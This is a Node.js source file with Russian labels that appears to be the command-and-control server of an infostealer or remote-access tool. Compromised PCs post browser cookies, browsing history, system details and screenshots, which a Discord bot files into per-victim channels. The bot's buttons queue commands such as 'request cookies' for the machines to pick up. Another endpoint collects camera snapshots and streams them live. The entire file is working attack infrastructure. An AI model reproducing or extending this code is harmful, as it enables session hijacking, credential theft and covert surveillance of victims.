import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import { fileURLToPath } from "url";
import { dirname, join } from "path";
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(express.json({ limit: "100mb" }));

// ---------- Конфиг ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_BASE_PC = "Все ПК";
const CATEGORY_BASE_CAM = "Камеры";
const ONLINE_TIMEOUT = 3 * 60 * 1000;

const LOG_CATEGORY = "Логи";
const LOG_CHANNEL = "server-logs";

const PC_DISCORD_UPLOAD_INTERVAL = 60 * 1000;
const CAMERA_DISCORD_UPLOAD_INTERVAL = 30 * 1000;
const LOG_THROTTLE_DEFAULT = 60 * 1000;
const CATEGORY_MAX_CHILDREN = 50;
const MAX_FILE_SIZE = 6 * 1024 * 1024;

// ---------- Состояние ----------
const onlinePCs = {};
const pendingCommands = {};
const channelByPC = {};
const channelByCam = {};
const wsCameraClients = {};

const camLastUpload = {};
const pcFileLastSent = {};
const lastLogTimestamps = {};

let logCategoryCache = null;
let logChannelCache = null;
let categoryCacheByGuild = new Map();
let channelCacheByGuild = new Map();

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------- Утилиты ----------
function shortHash(s, len = 8) {
    return crypto.createHash('sha1').update(s).digest('hex').slice(0,len);
}

function safeChannelName(prefix, id) {
    const h = shortHash(id, 8);
    return `${prefix}-${h}`.toLowerCase().replace(/[^a-z0-9\-]/g,'-').slice(0,90);
}

async function throttleLog(key, minIntervalMs=LOG_THROTTLE_DEFAULT){
    const now = Date.now();
    const last = lastLogTimestamps[key] || 0;
    if(now - last < minIntervalMs) return false;
    lastLogTimestamps[key] = now;
    return true;
}

async function logToDiscord(msg, key = null, minIntervalMs = LOG_THROTTLE_DEFAULT){
    try {
        if(key){
            const allowed = await throttleLog(key, minIntervalMs);
            if(!allowed) return;
        }
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
    } catch(e){
        console.error("Ошибка логирования в Discord:", e);
    }
}

// ---------- Категории и каналы ----------
async function findOrCreateCategoryWithSpace(guild, baseName){
    const channels = await guild.channels.fetch();
    const categories = channels.filter(c => c.type === ChannelType.GuildCategory && c.name.startsWith(baseName));
    for(const cat of categories.values()){
        const children = channels.filter(ch => ch.parentId === cat.id);
        if(children.size < CATEGORY_MAX_CHILDREN) return cat;
    }
    let idx = 1;
    let name = baseName;
    const existingNames = new Set([...categories.values()].map(c=>c.name));
    while(existingNames.has(name)){ idx++; name = `${baseName} - ${idx}`; }
    return await guild.channels.create({ name, type: ChannelType.GuildCategory });
}

async function getOrCreateCategory(guild, name){
    const gid = guild.id;
    if(!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid, {});
    const cache = categoryCacheByGuild.get(gid);
    if(cache[name]) return cache[name];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type === ChannelType.GuildCategory && c.name === name);

    if(matches.size>1){
        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp-a.createdTimestamp);
        const keep = sorted[0];
        const toDelete = sorted.slice(1);
        for(const cat of toDelete) try{ await cat.delete(); } catch(e){ console.error(e); }
        cache[name] = keep;
        return keep;
    }
    if(matches.size===1){ cache[name] = matches.first(); return matches.first(); }
    const created = await guild.channels.create({name, type:ChannelType.GuildCategory});
    cache[name] = created;
    return created;
}

async function getOrCreateTextChannel(guild, name, parentId){
    const gid = guild.id;
    if(!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid, {});
    const cache = channelCacheByGuild.get(gid);
    const cacheKey = `${name}::${parentId}`;
    if(cache[cacheKey]) return cache[cacheKey];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
    if(matches.size>1){
        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp-a.createdTimestamp);
        const keep = sorted[0];
        const toDelete = sorted.slice(1);
        for(const ch of toDelete) try{ await ch.delete(); } catch(e){ console.error(e); }
        cache[cacheKey] = keep;
        return keep;
    }
    if(matches.size===1){ cache[cacheKey] = matches.first(); return matches.first(); }

    const parent = await guild.channels.fetch(parentId).catch(()=>null);
    if(parent){
        const all = await guild.channels.fetch();
        const children = all.filter(ch => ch.parentId === parentId);
        if(children.size >= CATEGORY_MAX_CHILDREN){
            const baseName = parent.name.includes(' - ') ? parent.name.split(' - ')[0] : parent.name;
            const fallbackCat = await findOrCreateCategoryWithSpace(guild, baseName);
            parentId = fallbackCat.id;
        }
    }

    const created = await guild.channels.create({name, type:ChannelType.GuildText, parent:parentId});
    await logToDiscord(`Создан канал ${name} в категории ${parentId}`, `channel_created:${name}`, 5*60*1000);
    cache[cacheKey] = created;
    return created;
}

async function getOrCreateLogChannel(guild){
    if(logChannelCache) return logChannelCache;
    const category = logCategoryCache || await getOrCreateCategory(guild, LOG_CATEGORY);
    logCategoryCache = category;

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===LOG_CHANNEL && c.parentId===category.id);
    let channel;
    if(matches.size>0) channel = matches.first();
    else channel = await guild.channels.create({ name:LOG_CHANNEL, type:ChannelType.GuildText, parent:category.id });
    logChannelCache = channel;
    return channel;
}

// ---------- Кнопки ----------
function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

function safeStringify(obj, maxLen = MAX_FILE_SIZE){
    try{
        let s = JSON.stringify(obj, null, 2);
        if(Buffer.byteLength(s) <= maxLen) return s;
        const clone = JSON.parse(JSON.stringify(obj));
        const keysToTruncate = ['cookies','history','tabs','extensions'];
        for(const k of keysToTruncate){
            if(Array.isArray(clone[k]) && clone[k].length>200) clone[k] = clone[k].slice(0,200);
        }
        s = JSON.stringify(clone, null, 2);
        if(Buffer.byteLength(s) <= maxLen) return s;
        return s.slice(0, Math.min(s.length, maxLen-200)) + '\n...TRUNCATED...';
    }catch(e){ return 'serialization_error'; }
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async interaction => {
    if(!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    const lastPing = onlinePCs[pcId];
    const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);

    const replyOptions = { ephemeral: true };
    if(command === "check_online") {
        replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!isOnline){
        replyOptions.content = `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
    await interaction.reply(replyOptions);
});

// ---------- Upload PC ----------
app.post("/upload-pc", async (req,res)=>{
    try{
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({error:"pcId required"});
        const isNewPc = !onlinePCs[pcId];
        onlinePCs[pcId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await findOrCreateCategoryWithSpace(guild, CATEGORY_BASE_PC);
        const channelName = safeChannelName('pc', pcId);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild, channelName, category.id);
        channelByPC[pcId] = finalChannel.id;

        const now = Date.now();
        const lastSent = pcFileLastSent[pcId] || 0;
        const shouldSendFiles = (now - lastSent) > PC_DISCORD_UPLOAD_INTERVAL;

        const files = [];
        if(shouldSendFiles){
            if(cookies){
                const s = safeStringify({cookies});
                files.push({ attachment: Buffer.from(s), name: `${channelName}-cookies.json` });
            }
            if(history){
                const s = safeStringify({history});
                files.push({ attachment: Buffer.from(s), name: `${channelName}-history.json` });
            }
            if(systemInfo){
                const s = safeStringify({systemInfo});
                files.push({ attachment: Buffer.from(s), name: `${channelName}-system.json` });
            }
            if(screenshot){
                const buf = Buffer.from(screenshot, "base64");
                if(buf.length <= MAX_FILE_SIZE){
                    files.push({ attachment: buf, name:`${channelName}-screenshot.jpeg` });
                } else {
                    await logToDiscord(`📷 Снимок ПК ${pcId} слишком большой`, `file_too_large:${pcId}`, 60*1000);
                }
            }
        }

        const messageOptions = { components: createControlButtons(pcId) };
        if(files.length) messageOptions.files = files;
        else messageOptions.content = `🟢 ПК ${pcId} обновлён (таймстамп: ${new Date().toISOString()})`;

        await finalChannel.send(messageOptions);
        if(files.length) pcFileLastSent[pcId] = now;
        if(isNewPc) await logToDiscord(`🖥 Новый ПК зарегистрирован: ${pcId}`, `pc_registered:${pcId}`, 5*60*1000);

        res.json({success:true});
    }catch(e){
        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`, `error:upload-pc`, 10*1000);
        res.status(500).json({error:e.message});
    }
});

// ---------- Upload Camera ----------
app.post("/upload-cam", async (req,res)=>{
    try{
        const { camId, screenshot } = req.body;
        if(!camId || !screenshot) return res.status(400).json({ error:"camId and screenshot required" });

        if(wsCameraClients[camId]){
            wsCameraClients[camId].forEach(ws=>{ try{ ws.send(screenshot); }catch(e){} });
        }

        const now = Date.now();
        const last = camLastUpload[camId] || 0;
        const shouldSendToDiscord = (now - last) > CAMERA_DISCORD_UPLOAD_INTERVAL;
        camLastUpload[camId] = now;

        await logToDiscord(`📷 Камера активна: ${camId}`, `cam_active:${camId}`, 5*60*1000);

        if(shouldSendToDiscord){
            try{
                const guild = await bot.guilds.fetch(GUILD_ID);
                const category = await findOrCreateCategoryWithSpace(guild, CATEGORY_BASE_CAM);
                const channelName = safeChannelName('cam', camId);
                const channel = channelByCam[camId] ? await guild.channels.fetch(channelByCam[camId]).catch(()=>null) : null;
                const finalChannel = channel || await getOrCreateTextChannel(guild, channelName, category.id);
                channelByCam[camId] = finalChannel.id;

                const buffer = Buffer.from(screenshot, "base64");
                if(buffer.length <= MAX_FILE_SIZE){
                    await finalChannel.send({ files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
                    await logToDiscord(`📷 Снимок камеры ${camId} отправлен в ${finalChannel.name}`, `cam_snapshot_sent:${camId}`, 30*1000);
                } else {
                    await logToDiscord(`📷 Снимок камеры ${camId} слишком большой (${buffer.length} байт)`, `cam_snapshot_too_large:${camId}`, 60*1000);
                }
            }catch(e){
                console.error("Ошибка отправки снимка камеры в Discord:", e);
                await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`, `error:upload-cam`, 10*1000);
            }
        }

        res.json({success:true});
    }catch(e){
        await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`, `error:upload-cam`, 10*1000);
        res.status(500).json({error:e.message});
    }
});

// ---------- Ping ----------
app.post("/ping", (req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({error:"pcId required"});
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({commands});
});

app.post("/ping-cam", (req,res)=>{
    const { camId } = req.body;
    if(!camId) return res.status(400).json({error:"camId required"});
    res.json({success:true});
});

// ---------- API фронта ----------
app.get("/api/online-pcs", (req,res)=> res.json(Object.keys(onlinePCs)));

// ---------- Статика ----------
app.use(express.static(join(__dirname,"public")));

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req)=>{
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId");
    if(!camId) return ws.close();
    if(!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);
    ws.on("close", ()=>{ wsCameraClients[camId] = wsCameraClients[camId].filter(c=>c!==ws); });
});

// ---------- HTTP Server ----------
const server = http.createServer(app);
server.on("upgrade", (request, socket, head)=>{
    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);

process.on("uncaughtException", e=> logToDiscord(`💥 Uncaught Exception: ${e.message}`, `uncaught:${e.message}`, 10*1000));
process.on("unhandledRejection", e=> logToDiscord(`💥 Unhandled Rejection: ${e}`, `unhandled:${String(e)}`, 10*1000));
